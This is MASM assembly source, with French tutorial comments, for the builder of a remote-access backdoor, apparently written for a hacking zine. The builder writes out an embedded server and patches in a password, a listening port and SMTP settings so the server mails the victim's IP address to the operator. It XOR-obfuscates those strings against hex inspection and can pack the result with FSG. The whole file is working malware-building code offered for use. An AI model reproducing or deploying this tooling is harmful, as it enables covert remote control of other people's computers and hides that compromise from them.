.386
.model flat,stdcall
option casemap:none

DlgProc proto :DWORD,:DWORD,:DWORD,:DWORD

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\shell32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\strings.lib

.data
Offset_BackPort		EQU	4750
Offset_SmtpPort		EQU	6259

DlgName 			DB		"MyDialog",0
sz_About_Text		DB 		"Welcome in the Ice's Backdoor, Written 100% in ASM, with MASM and WinAsm. :)",13,10,13,10,"Programmed in May 2005.",\
                            13,10,"Made for example of a ASM Little Backdoor, just for n0name mag #1.",0
sz_About_Text2		DB		13,10,13,10,"Thanks for using this tool. For feedbacks, comment, others, mail at : snow_mole@hotmail.com :)",13,10,13,10,"Thanks to Aphex for the injection model, and to n0name, for .. being n0name :)",13,10,13,10,"Program with his sources ( Server, EditServer, Resources )",13,10,13,10,"Thanks again, and Have Fun :]",13,10,13,10,"Icingtaupe",0
sz_About_Caption	DB		"About ?",0
HighPort			DB		"Error : You have setted a bad port. A port must be between 1 and 65535",0
sz_ServerName		DB		"Server.exe",0
sz_Server_Built		DB		"Your server is now ready. If you want to pack him, you can with the one of your choice. Have fun ;)",0
sz_Server_Cap		DB		"Work Finished",0
Xor_Key				EQU		200
sz_Err0r			DB		"Critical err0r",0
sz_SmtpTooLong		DB		"Err0r : The SMTP Server's name you set is too long.",0
sz_PassTooLong		DB		"Err0r : The Pass you set is too long.",0
sz_MailTooLong		DB		"Err0r : The 'Mail From' you set is too long.",0
sz_RcptTooLong		DB		"Err0r : The destinatory's mail you set is too long",0
sz_Enter			DB		">",13,10,0
sz_Helo				DB		"helo ",0
sz_MailFrom			DB		"mail from: <",0
sz_RcptTo			DB		"rcpt to: <",0
sz_EndOfMail		DB		"data",13,10,"IP de la Victime : ",0
sz_Fsg				DB		"fsg.exe",0
sz_FsgLine			DB		"fsg.exe Server.exe",0

.const
IDC_STATIC3004                  Equ 3004
IDC_STATIC3015                  Equ 3015
IDC_STATIC3017                  Equ 3017
IDC_STATIC3009                  Equ 3009
IDC_STATIC3010                  Equ 3010
IDC_STATIC3011                  Equ 3011
IDC_STATIC3007                  Equ 3007
IDC_EXIT                        Equ 3002
IDC_SMTP_Addr                   Equ 3005
IDC_Mail_From                   Equ 3008
IDC_Mail_To                     Equ 3013
IDC_Back_Port                   Equ 3014
IDC_Victim_Label                Equ 3016
IDC_About                       Equ 3018
IDC_MAKE                        Equ 3020
IDC_SMTP_Port                   Equ 3021
MAIN_ICO                        Equ 10000
IDC_FsgPack                     Equ 3022


.data?
hInstance 			HINSTANCE ?
Process_Info		PROCESS_INFORMATION <>
Start_Info			STARTUPINFO <>


hNewModule 			DWORD ?
hProcess 			DWORD ?
dwSize 				DWORD ?
dwPid 				DWORD ?
dwBytesWritten 		DWORD ?
dwTid 				DWORD ? 

sz_About_Txt		DB		256 DUP(?)

sz_SMTP_Addr		DB		100 DUP(?)
sz_Mail_From		DB		100 DUP(?)
sz_Helo_Serv		DB		100 DUP(?)
sz_Mail_To			DB		100 DUP(?)
sz_End_Of_Mail		DB		100 DUP(?)
sz_Victim_Label		DB		100 DUP(?)
sz_TempBuffer		DB		800 DUP(?)

nb_Back_Port		DD		?
nb_SMTP_Port		DD		?
hTemp				DD		?
hRes				DD		?
hFsg				DD		?
hServer				DD		?
hThread				DD		?
Byte_Written		DD		?

.const
IDC_EXIT            EQU 	3002
IDC_SMTP_Addr 		EQU  	3005
IDC_Mail_From 		EQU  	3008
IDC_Mail_To 		EQU  	3013
IDC_Back_Port 		EQU  	3014
IDC_Victim_Label 	EQU  	3016
IDC_About 			EQU		3018
IDC_MAKE 			EQU 	3020

IDC_SMTP_Port 		EQU 	3021

MAIN_ICO			EQU		10000
.code


start:

	Push 0
	Call GetModuleHandle
	
	Mov  hInstance, EAX	; On récupere un handle pour le processus actuel
   
    Push MAIN_ICO
    Push hInstance
    Call LoadIcon		; on charge l'icon
    
    Push 0
    Push OFFSET DlgProc
    Push 0
    Push OFFSET DlgName
    Push hInstance
    Call DialogBoxParam	; on crée la boite de dialogue, huhu
    
    Push EAX
    Call ExitProcess
    
_Encrypt proc
	Push OFFSET sz_MailFrom		; On bouge la variable sz_MailFrom dans le buffer "sz_TempBuffer"
	Push OFFSET sz_TempBuffer	; Sz_TempBuffer = "mail from: <"
	Call lstrcat
	
	Push OFFSET sz_Mail_From	; On y concatene la valeur entrée par l'utilisateur, disons "moi@serveur.com"
	Push OFFSET sz_TempBuffer	; sz_TempBuffer = "mail from: <moi@serveur.com"
	Call lstrcat
	
	Push OFFSET sz_Enter		; On y concatene de nouveau la variable "enter" au buffer :
	Push OFFSET sz_TempBuffer	; sz_TempBuffer = mail from: <moi@serveur.com>{retour chariot}
	Call lstrcat				; Les caractères ASCII 13 et 10 representent les caractères de retour chariot. ( enter )
	
	Push SIZEOF sz_Mail_From	; On vide le buffer ou est situé ce qu'a entré l'utilisateur, pour le liberer
	Push OFFSET sz_Mail_From
	Call RtlZeroMemory
	
	Push OFFSET sz_TempBuffer	; On mets le contenu de sz_TempBuffer dans sz_Mail_From, soit un autre buffer.
	Push OFFSET sz_Mail_From	; On est donc parti de "moi@serveur.com" pour arriver a 
	Call lstrcat				; mail from: <moi@serveur.com>{enter}
	
	Push SIZEOF sz_TempBuffer
	Push OFFSET sz_TempBuffer
	Call RtlZeroMemory			; On vide le buffer sz_TempBuffer
	
	Push OFFSET sz_Helo			; On y place le début de notre sequence SMTP, soit "helo"
	Push OFFSET sz_TempBuffer	
	Call lstrcat
	
	Push OFFSET sz_SMTP_Addr 	; On prend l'adresse du serveur STMP qu'a entré l'utilisateur, 
	Push OFFSET sz_TempBuffer	; on la copie dans sz_TempBuffer ( qui etait donc vide )
	Call lstrcat				; Disons que SMTP_Addr = smtp.mail.com
	
	Mov EDI, OFFSET sz_TempBuffer ; Petite boucle afin de modifier le buffer
	Mov ESI, EDI
	@AddEnter:
		Lodsb					; on prend le premier caractère de sz_TempBuffer, on le charge dans le registre AL
		Cmp AL, 0				; On le compare a 0 ( fin de variable )
		Je @EndAdd				; C'est la fin ? On saute a @EndAdd
		Stosb					; Nop, pas encore la fin. On stock dans le buffer sz_TempBuffer 
		Jmp @AddEnter
	@EndAdd:
		Mov AL, 13				; Ha, c'était le caractère de fin. Bon, on met 13 dans AL, première partie d'un "enter"
		Stosb					; on l'ajoute au buffer sz_TempBuffer
		Mov AL,10				; On met dans AL la deuxième partie du "enter"
		Stosb					; on l'ajoute au buffer
		Mov AL, 0				; caractère de fin mis dans AL ( faut bien terminer la variable )
		Stosb					; et on stock ! :]
								; On a donc ajouté les caractères afin d'effectuer un retour chariot au buffer
	Push OFFSET sz_TempBuffer	; sz_TempBuffer = helo smtp.mail.com{enter}
	Push OFFSET sz_Helo_Serv	; Et on le met dans le buffer "sz_Helo_Serv
	Call lstrcat
	
	Push SIZEOF sz_TempBuffer	; On vide le buffer TempBuffer
	Push OFFSET sz_TempBuffer
	Call RtlZeroMemory		; #######################
	
	Push OFFSET sz_RcptTo		; on commence la séquence de rcpt ( => destinataire pour le SMTP )
	Push OFFSET sz_TempBuffer	; on le met dans TempBuffer. Disons que le destinataire soit "destinataire@mail.com"
	Call lstrcat				; sz_TempBuffer = rcpt to: <
	
	Push OFFSET sz_Mail_To		; On ajoute ce que l'utilisateur a entré
	Push OFFSET sz_TempBuffer	; sz_TempBuffer = rcpt to: <destinataire@mail.com
	Call lstrcat
	
	Push OFFSET sz_Enter		; On termine la variable :]
	Push OFFSET sz_TempBuffer	; sz_TempBuffer = rcpt to: <destinataire@mail.com>{enter}
	Call lstrcat
	
	Push SIZEOF sz_Mail_To		; On vide le buffer ou était placé ce qu'avait entré l'utilisateur
	Push OFFSET sz_Mail_To
	Call RtlZeroMemory
	
	Push OFFSET sz_TempBuffer	; On y met la  valeur de tempbuffer, on est donc parti de "destinataire@mail.com" 
	Push OFFSET sz_Mail_To		; et on a terminé a "rcpt to: <destinataire@mail.com{enter}
	Call lstrcat
	
	Push SIZEOF sz_TempBuffer
	Push OFFSET sz_TempBuffer
	Call RtlZeroMemory	; ########################

	Mov EDI, OFFSET sz_Victim_Label	; Cryptage du password
	Mov ESI, EDI
	
	@Crypt1:
		Lodsb
		Cmp AL, 0
		Je @EndCrypt1
		Xor Al, Xor_Key			; On xor chaque caractère par la valeur de xor_key, soit 200 ici
		Stosb
		Jmp @Crypt1
	@EndCrypt1:
		Stosb
	
	Mov EDI, OFFSET sz_SMTP_Addr ; idem pour l'adresse du serveur SMTP
	Mov ESI, EDI
	
	@Crypt2:
		Lodsb
		Cmp AL, 0
		Je @EndCrypt2
		Xor Al, Xor_Key
		Stosb
		Jmp @Crypt2
	@EndCrypt2:
		Stosb
	
	Mov EDI, OFFSET sz_Mail_To ; derechef pour le buffer sz_Mail_To
	Mov ESI, EDI
	@Crypt3:
		Lodsb
		Cmp AL, 0
		Je @EndCrypt3
		Xor Al, Xor_Key
		Stosb
		Jmp @Crypt3
	@EndCrypt3:
		Stosb
	
	Mov EDI, OFFSET sz_Mail_From 	; Blablabla ..
	Mov ESI, EDI
	@Crypt4:
		Lodsb
		Cmp AL, 0
		Je @EndCrypt4
		Xor Al, Xor_Key
		Stosb
		Jmp @Crypt4
	@EndCrypt4:
		Stosb	
		
	Mov EDI, OFFSET sz_End_Of_Mail	; Ca commence a devenir répétitif. Pourquoi crypter tout ca ? Parfce que le serveur 
	Mov ESI, OFFSET sz_EndOfMail	; en a besoin, et que l'on ne désire pas que tout soit lisible par 
									; simple hexaédition .. donc, cryptage oblige. :]
	@Crypt5:
		Lodsb
		Cmp AL, 0
		Je @EndCrypt5
		Xor Al, Xor_Key
		Stosb
		Jmp @Crypt5
	@EndCrypt5:
		Stosb	
	
	Mov EDI, OFFSET sz_Helo_Serv
	Mov ESI, EDI
	
	@Crypt6:
		Lodsb
		Cmp AL, 0
		Je @EndCrypt6
		Xor Al, Xor_Key
		Stosb
		Jmp @Crypt6
	@EndCrypt6:
		Stosb	
	Ret
_Encrypt EndP

    
DlgProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
    .IF uMsg == WM_INITDIALOG
    	Push IDC_SMTP_Addr
    	Push hWnd
    	Call GetDlgItem	
    	
    	Push EAX
    	Call SetFocus
    	
    	Push 10000
		Push hInstance
		Call LoadIcon
		
		Push EAX
		Push 1
		Push WM_SETICON
		Push hWnd
		Call SendMessage
    .ELSEIF uMsg == WM_CLOSE
    	Push 0
    	Push hWnd
    	Call EndDialog
    .ELSEIF uMsg == WM_COMMAND
        Mov  EAX,wParam 
        Mov EDX,wParam
        Shr EDX,16
            .IF DX == BN_CLICKED		
                .IF AX == IDC_MAKE	; Han, il a cliqué sur "Make Server" !
                	Push FALSE
                	Push 0
                	Push IDC_Back_Port
                	Push hWnd
                	Call GetDlgItemInt

                	Mov  nb_Back_Port,  EAX	; on récupere les ports pour la backdoor et le SMTP
                	
                	Push FALSE
                	Push 0
                	Push IDC_SMTP_Port
                	Push hWnd
                	Call GetDlgItemInt 

                	Mov  nb_SMTP_Port,  EAX
                	
                	
                	.IF nb_Back_Port > 65535 ; verification si on s'est pas fait avoir, que le portsoit supérieur au max, soit 65535
            		  	Push MB_OK
	                	Push 0
	                	Push OFFSET HighPort
	                	Push hWnd
	                	Call MessageBox 
	                	
	                	JMP @End
                	               	                	
               		.ELSEIF nb_SMTP_Port > 65535
				      	Push MB_OK
	                	Push 0
	                	Push OFFSET HighPort
	                	Push hWnd
	                	Call MessageBox 
	                	
	                	JMP @End
                	              	
                	.ENDIF		; Non, c'est cool, on continue
                                	
                	Push 100
                	Push OFFSET sz_SMTP_Addr
                	Push IDC_SMTP_Addr
                	Push hWnd
                	Call GetDlgItemText	 ; On récupere le texte entré par l'utilisateur pour l'adresse du serveur SMTP
                		.IF EAX > 33	; Verification de si c'est pas trop long ? Non ? Alors on continue !
	                		Push SIZEOF sz_SMTP_Addr
	                		Push OFFSET sz_SMTP_Addr
	                		Call RtlZeroMemory
	                		
	                		Push MB_OK+MB_ICONHAND
	                		Push OFFSET sz_SmtpTooLong
	                		Push OFFSET sz_Err0r
	                		Push hWnd
	                		Call MessageBox
	                			
	                		Jmp @End	
                		.ENDIF 
                	Push 100
                	Push OFFSET sz_Mail_From
                	Push IDC_Mail_From
                	Push hWnd
                	Call GetDlgItemText	; Idem .. pour l'envoyeur du mail
                		.IF EAX > 37
                		Push SIZEOF sz_SMTP_Addr
                		Push OFFSET sz_SMTP_Addr
                		Call RtlZeroMemory
                		
                		Push SIZEOF sz_Mail_From
                		Push OFFSET sz_Mail_From
                		Call RtlZeroMemory
                		
                		Push MB_OK+MB_ICONHAND
                		Push OFFSET sz_MailTooLong
                		Push OFFSET sz_Err0r
                		Push hWnd
                		Call MessageBox
                		
                		Jmp @End
                		.ENDIF 
                	
                	Push 100
                	Push OFFSET sz_Mail_To
                	Push IDC_Mail_To
                	Push hWnd
                	Call GetDlgItemText		; Pour le destinataire, encore une fois :]
                	
                		.IF EAX > 33
	                		Push SIZEOF sz_SMTP_Addr
	                		Push OFFSET sz_SMTP_Addr
	                		Call RtlZeroMemory
	                		
	                		Push SIZEOF sz_Mail_From
	                		Push OFFSET sz_Mail_From
	                		Call RtlZeroMemory
	                		
	                		Push SIZEOF sz_Mail_To
	                		Push OFFSET sz_Mail_To
	                		Call RtlZeroMemory
	                		
	                		Push MB_OK+MB_ICONHAND
	                		Push OFFSET sz_RcptTooLong
	                		Push OFFSET sz_Err0r
	                		Push hWnd
	                		Call MessageBox
	                		
	                		Jmp @End
                		.ENDIF 
                	
                	Push 100
                	Push OFFSET sz_Victim_Label
                	Push IDC_Victim_Label
                	Push hWnd
                	Call GetDlgItemText	; Allez, parce qu'on adore ca, on le refait pour le password !
                	
                		.IF EAX > 35
	                		Push SIZEOF sz_Victim_Label
	                		Push OFFSET sz_Victim_Label
	                		Call RtlZeroMemory
	                		
	                		Push SIZEOF sz_SMTP_Addr
	                		Push OFFSET sz_SMTP_Addr
	                		Call RtlZeroMemory
	                		
	                		Push SIZEOF sz_Mail_From
	                		Push OFFSET sz_Mail_From
	                		Call RtlZeroMemory
	                		
	                		Push SIZEOF sz_Mail_To
	                		Push OFFSET sz_Mail_To
	                		Call RtlZeroMemory
	                		
	                		Push MB_OK+MB_ICONHAND
	                		Push OFFSET sz_PassTooLong
	                		Push OFFSET sz_Err0r
	                		Push hWnd
	                		Call MessageBox
	                		
	                		Jmp @End
                		.ENDIF 
                	
                	Mov EDI, OFFSET sz_Victim_Label ; On ajotue le caractère "10" qui fait partie du caractère entrée
                	Mov ESI, EDI	; On fait ceci car Netcat envoie le caractère 10 en tant qu'{enter}
                	@Loop:			; Or, vu que l'on s'y connecte et que le serveur fait une comparaison 
                	Lodsb			; entre le pass crypté et ce que l'on a entré, il FAUT specifier le caractère 10 le buffer
                	Cmp AL,0
                	Je @EndLoop
                	Stosb
                	Jmp @Loop
                	@EndLoop:
                	Mov AL, 10
                	Stosb
                	Mov AL, 0
                	Stosb
                	                       	
               	Call _Encrypt		; On appelle la routine déja commentée, qui crypte le tout et prépare les données entrées
               						; pour l'écriture du serveur 

                	; Ouverture et Creation du fichier server 
                	Push 0
                	Push FILE_ATTRIBUTE_NORMAL
                	Push CREATE_ALWAYS
                	Push 0
                	Push 0
                	Push GENERIC_WRITE
                	Push OFFSET sz_ServerName
                	Call CreateFile

                	Mov  hServer, EAX
                   
                	Push RT_RCDATA		; On le localise dans les resources
					Push 12345
					Push 0
					Call FindResource
					
					Mov  hTemp, EAX
					
					Push EAX		; On le charge
					Push 0
					Call LoadResource
					
					Mov  hRes, EAX
					
					Push hTemp	; On calcule sa taille
					Push 0
					Call SizeofResource
					
					Push 0
					Push OFFSET Byte_Written
					Push EAX
					Push hRes
					Push hServer
					Call WriteFile	; On l'ecrit !
					
               
					; Inscription du mot de passe
                	Push FILE_BEGIN
                	Push 0
                	Push 7891			; Offset ou l'on doit ecrire le pass
                	Push hServer
                	Call SetFilePointer ; On bouge le filepointer la bas
                              
                  	Push OFFSET sz_Victim_Label	; on calcule la taille du pass
                	Call lstrlen
                	
                	Inc  EAX		; on ajoute dans la taille le 'null caracter', qui termine la variable
                					; car lstrlen ne le note pas 
                	
                	Push 0
                	Push OFFSET Byte_Written
                	Push EAX
                	Push OFFSET sz_Victim_Label	; on écrit donc dans le serveur le pass crypté
                	Push hServer		; avec la prise en charge du 0 a la fin
                	Call WriteFile		; pour que le serveur prenne bien la variable et rien d'autre après
                						; ( la place alouée dans le serveur est pleine d'espace. Sans ce 0, le serveur compterait
                						; ces espaces, en PLUS du pass. On aurait donc "pass{enter}( pleins d'espaces ) ...
                	Push 100
                	Call Sleep			; Petite pause, soufflons
                	; Ecriture du "Helo *server*"
                	Push FILE_BEGIN
                	Push 0
                	Push 7961			; On refait pareil, pour la sequence SMTP
                	Push hServer
                	Call SetFilePointer
                	
                	Push OFFSET sz_Helo_Serv	
                	Call lstrlen
                	
                	Push 0
                	Push OFFSET Byte_Written
                	Push EAX
                	Push OFFSET sz_Helo_Serv ; On inscrit le "helo smtp.mail.com"
                	Push hServer			; SANS prendre en charge le 0, car s'ensuit tous le reste des settings pour le
                	Call WriteFile			; serveur SMTP. Dans le serveur, 
                							; Nous avons défini la variable a envoyer au serveur sous un seul nom,
                	Push 100				; ce qui explique le fait que nous ne devons pas ajouter le 0 ni modifier l'offset du pointeur sur le fichier
                	Call Sleep				; afin que tout soit considéré comme une seule variable
                	; Ecriture du "Mail From:"
                	Push OFFSET sz_Mail_From
                	Call lstrlen
               	
                	Push 0
                	Push OFFSET Byte_Written
                	Push EAX
                	Push OFFSET sz_Mail_From	; Qu'est ce que je disais ? :]
                	Push hServer
                	Call WriteFile
                	
                	Push 100
                	Call Sleep
                	; Ecriture du "Mail To:"
            	
                	Push OFFSET sz_Mail_To
                	Call lstrlen
                	
                	Push 0
                	Push OFFSET Byte_Written
                	Push EAX
                	Push OFFSET sz_Mail_To
                	Push hServer
                	Call WriteFile
                	
                	Push 100
                	Call Sleep
                	
                	Push OFFSET sz_End_Of_Mail
                	Call lstrlen					; on a donc ecrit dans le serveur, la sequence suivante, en crypté :
                									; helo smtp.server.com{enter}
                	Inc EAX							; mail from: <envoyeur@mail.com>{enter}
                	Push 0							; rcpt to: <destinataire@mail.com>{enter}
                	Push OFFSET Byte_Written		; data{enter}
                	Push EAX						; IP De la victime :{fin de la variable}
                	Push OFFSET sz_End_Of_Mail		; La variable sera ainsi recuperée, l'IP ajoutée a cette variable.
                	Push hServer
                	Call WriteFile

   
                	; Inscription de l'adresse SMTP
                	Push FILE_BEGIN
                	Push 0
                	Push 7927
                	Push hServer					; On ecrit l'adresse pour la connexion au serveur
                	Call SetFilePointer				; SMTP, sans le helo 
                	
                	Push OFFSET sz_SMTP_Addr
                	Call lstrlen
                	
                	Inc  EAX						; ce coup ci, on prend en charge le 0
                	
                	Push 0
                	Push OFFSET Byte_Written
                	Push EAX
                	Push OFFSET sz_SMTP_Addr
                	Push hServer
                	Call WriteFile

                	; Ecriture du "Backdoor Port"
                	Push FILE_BEGIN
                	Push 0
                	Push Offset_BackPort			; Offset_BackPort est défini dans la section .data
                	Push hServer
                	Call SetFilePointer
                	
                	Push OFFSET nb_Back_Port
                	Call lstrlen
                	
                	Push 0
                	Push OFFSET Byte_Written
                	Push EAX
                	Push OFFSET nb_Back_Port
                	Push hServer
                	Call WriteFile
                	
                	; Inscription du port SMTP
                	Push FILE_BEGIN
                	Push 0
                	Push Offset_SmtpPort		; Idem
                	Push hServer
                	Call SetFilePointer
                	
                	Push OFFSET nb_SMTP_Port
                	Call lstrlen
                	
                	Push 0
                	Push OFFSET Byte_Written
                	Push EAX
                	Push OFFSET nb_SMTP_Port
                	Push hServer
                	Call WriteFile

					Push IDC_FsgPack
					Push hWnd
					Call GetDlgItem		; On prend le handle pour le controle "FSG Pack"
					
					Push 0
					Push 0
					Push BM_GETCHECK
					Push EAX
					Call SendMessage	; Il est coché, le bougre ?

						.IF EAX == BST_CHECKED	; Ha, oui !
							Push hServer
                			Call CloseHandle	; On ferme le handle vers le serveur, pour le laisser "libre"
						
							Push 0
		                	Push FILE_ATTRIBUTE_NORMAL
		                	Push CREATE_ALWAYS
		                	Push 0
		                	Push 0
		                	Push GENERIC_WRITE
		                	Push OFFSET sz_Fsg
		                	Call CreateFile		; On crée le ficher FSG.exe, pour packer le serveur 
		
		                	Mov  hFsg, EAX
		                   
		                	Push RT_RCDATA
							Push 12344
							Push 0
							Call FindResource	; même chose qu'avec le serveur 
							
							Mov  hTemp, EAX
							
							Push EAX
							Push 0
							Call LoadResource
							
							Mov  hRes, EAX
							
							Push hTemp
							Push 0
							Call SizeofResource
							
							Push 0
							Push OFFSET Byte_Written
							Push EAX
							Push hRes
							Push hFsg
							Call WriteFile
							
							Push hFsg
							Call CloseHandle	; on ferme le handle vers le packeur, pour le laisser libre et utilisable
							
							Push SW_SHOW
							Push 0
							Push OFFSET sz_ServerName
							Push OFFSET sz_Fsg
							Push 0
							Push hWnd
							Call ShellExecute	; on l'execute avec en parametre le nom du serveur, soit fsg.exe server.exe
							
							Push 1500
							Call Sleep		; on attend une seconde et demi, que le programme ait terminé ( pour le fun )
							
							.ENDIF
                	Push MB_OK+MB_ICONASTERISK
                	Push OFFSET sz_Server_Cap
                	Push OFFSET sz_Server_Built
                	Push hWnd	
                	Call MessageBox		; On avertit "Hey gars, ton serveur est terminé et packé si besoin est !"
                	
                	@End:
                	                	
                	Push hServer
                	Call CloseHandle
                	
			       	Push SIZEOF sz_SMTP_Addr	; Remise a zéro de tous les buffers ou presque, pour le cas ou.
					Push OFFSET sz_SMTP_Addr
					Call RtlZeroMemory
					
					Push SIZEOF sz_Mail_From
					Push OFFSET sz_Mail_From
					Call RtlZeroMemory
					
					Push SIZEOF sz_Helo_Serv
					Push OFFSET sz_Helo_Serv
					Call RtlZeroMemory
					
					Push SIZEOF sz_Mail_To
					Push OFFSET sz_Mail_To
					Call RtlZeroMemory
					
					Push SIZEOF sz_Victim_Label
					Push OFFSET sz_Victim_Label
					Call RtlZeroMemory
					
					Push SIZEOF sz_TempBuffer
					Push OFFSET sz_TempBuffer
					Call RtlZeroMemory
					
					Push SIZEOF sz_End_Of_Mail
					Push OFFSET sz_End_Of_Mail
					Call RtlZeroMemory
					                	                             
                .ELSEIF AX == IDC_About	; l'utilisateur a créé sur le bouton "?"
                	Push 256
                	Push OFFSET sz_About_Txt
                	Call RtlZeroMemory
 
                	Push OFFSET sz_About_Text
                	Push OFFSET sz_About_Txt
                	Call lstrcat			; on affiche le texte, tout simplement
                	
  					Push OFFSET sz_About_Text2
                	Push OFFSET sz_About_Txt
                	Call lstrcat
                	
                	Push MB_OK+MB_ICONASTERISK
                	Push OFFSET sz_About_Caption
                	Push OFFSET sz_About_Txt
                	Push hWnd
                	Call MessageBox                
                .ELSEIF AX == IDC_EXIT
                	Push 0
                	Push hWnd
                	Call EndDialog
                .ENDIF
            .ENDIF
       
    .ELSE
        Mov EAX, FALSE
        Ret
    .ENDIF
    Mov EAX, TRUE
    Ret
DlgProc ENDP
 END start